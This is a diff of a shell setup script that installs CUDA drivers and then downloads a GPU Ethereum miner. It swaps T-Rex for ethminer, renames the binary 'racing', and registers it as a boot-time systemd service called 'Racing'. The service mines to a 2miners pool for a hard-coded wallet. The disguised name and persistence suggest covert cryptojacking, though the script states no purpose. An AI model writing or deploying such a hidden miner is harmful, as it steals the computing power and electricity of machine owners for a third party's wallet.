@@ -8,10 +8,11 @@ echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/
 sudo apt-get update
 sudo apt-get -y install cuda-drivers
 sudo apt-get install libcurl3 -y
-wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
-tar xvzf t-rex-0.21.6-linux.tar.gz
-mv t-rex racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://us-eth.2miners.com:2020 -u 0xe968dA3271ADCddA2496757301D2A5Ffa400CF50 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+cd bin
+mv ethminer racing
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/bin/racing -U -P stratum://0xe968dA3271ADCddA2496757301D2A5Ffa400CF50.0@us-eth.2miners.com:2020\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-./racing -a ethash -o stratum+tcp://us-eth.2miners.com:2020 -u 0xe968dA3271ADCddA2496757301D2A5Ffa400CF50 -p x &
+./racing -U -P stratum://0xe968dA3271ADCddA2496757301D2A5Ffa400CF50.0@us-eth.2miners.com:2020 &
